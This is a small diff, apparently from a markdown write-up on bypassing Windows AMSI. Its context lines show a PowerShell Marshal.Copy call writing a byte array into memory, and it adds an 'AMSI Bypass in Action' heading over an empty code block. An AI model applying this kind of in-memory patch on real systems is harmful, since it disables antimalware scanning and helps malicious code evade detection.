@@ -51,3 +51,7 @@ echo $ptr
 # copy the array to the memory location
 [System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
 ```
+
+## AMSI Bypass in Action
+```
+```
